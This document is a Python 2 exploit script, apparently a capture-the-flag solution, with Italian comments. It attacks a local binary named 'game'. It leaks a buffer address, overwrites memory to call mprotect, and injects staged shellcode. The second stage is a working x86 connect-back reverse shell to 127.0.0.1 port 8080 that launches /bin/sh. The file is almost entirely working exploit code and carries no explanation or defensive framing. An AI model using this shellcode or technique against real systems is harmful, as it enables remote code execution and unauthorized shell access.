import subprocess
import fcntl
import os
import select
from time import sleep
from async_subprocess import AsyncPopen
from struct import pack, unpack

stage1 = "\x90\x90\x68\x00\x05\x00\x00\xB8\x80\x84\x04\x08\xFF\xD0\x89\xC1\x68\x00\x04\x00\x00\x50\x6A\x00\xB8\x50\x84\x04\x08\xFF\xD0\xFF\xD1\x90\x90\x90\x90"

IPADDR = "\x7f\x00\x00\x01"
PORT = "\x1f\x90"

stage2 = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2" + \
"\xb0\x66\xb3\x01\x51\x6a\x06\x6a" + \
"\x01\x6a\x02\x89\xe1\xcd\x80\x89" + \
"\xc6\xb0\x66\x31\xdb\xb3\x02\x68" + \
IPADDR + "\x66\x68" + PORT +"\x66\x53\xfe" + \
"\xc3\x89\xe1\x6a\x10\x51\x56\x89" + \
"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe" + \
"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31" + \
"\xc0\x52\x68\x6e\x2f\x73\x68\x68" + \
"\x2f\x2f\x62\x69\x89\xe3\x52\x53" + \
"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd" + \
"\x80";

def debugInput(p,input, debug=True):
	if debug:
		print "Input:", input
	return p.communicate(input)

def readAll(p):
	buf = ""
	while True:
		ready, _, _ = select.select((p,), (), (), .1)
#		print ready
		if p in ready:
			buf += p.read(1)
		else:
			return buf
	return buf

def dumpSeq():
	sleep(.1)
	(out, err) = debugInput(p,"")
#	print out
	print debugInput(p,"1\n")

	sleep(.1)
	(out, err) = debugInput(p,"100\n")
	print out

	sleep(.1)
	(out, err) = debugInput(p,"2\n")
	print out


p = AsyncPopen("./game", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

raw_input("Premi per proseguire")

dumpSeq()

sleep(.1)
(out, err) = debugInput(p,"")
dump = out.split("\n")
originalbuf = dump[60]
newbuffer = int(originalbuf, 16)+240
print originalbuf

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"61\n")
print out

for i in range(0,60):
	sleep(.1)
	(out, err) = debugInput(p,"%d\n"%i)
	print out

sleep(.1)
newbuf = str(int(originalbuf,16)+(4*60) )
(out, err) = debugInput(p,newbuf+"\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out

dumpSeq()

sleep(.1)
(out, err) = debugInput(p,"")
print out

#Scriviamo la mprotect in sum
mprotect = "08048440"

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"3\n")
print out

sleep(.1)
(out, err) = debugInput(p,newbuf+"\n")
print out

sleep(.1)
(out, err) = debugInput(p,str(int(mprotect,16))+"\n")
print out

sleep(.1)
(out, err) = debugInput(p,str(int(originalbuf,16))+"\n")
print out


dumpSeq()

sleep(.1)
(out, err) = debugInput(p,"")
print out


#MEttiamo a posto il buffer

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"1\n")

sleep(.1)
(out, err) = debugInput(p,str(int(originalbuf,16))+"\n")
print out

#parametri mprotect
sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"2\n")
print out

sleep(.1)
(out, err) = debugInput(p,str(int(originalbuf[:-3]+"000",16))+"\n")
print out

sleep(.1)
(out, err) = debugInput(p,"100\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out

dumpSeq()

sleep(.1)
(out, err) = debugInput(p,"")
print out



##chiamiamo la sum

sleep(.1)
(out, err) = debugInput(p,"4\n")
print out

sleep(.1)
(out, err) = debugInput(p,"0\n")
print out

sleep(.1)
(out, err) = debugInput(p,"7\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"%d\n" % (len(stage1)/4))
print out

for i in range(0,len(stage1)/4):
	sleep(.1)
	(out, err) = debugInput(p,"%d\n" % unpack("i",stage1[i*4:(i+1)*4]))
	print out
	

sleep(.1)
(out, err) = debugInput(p,"4\n")
print out

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"7\n")
print out

#Manda lo shellcod bbuono

sleep(.1)
(out, err) = debugInput(p,stage2)
print out



raw_input("pausa")








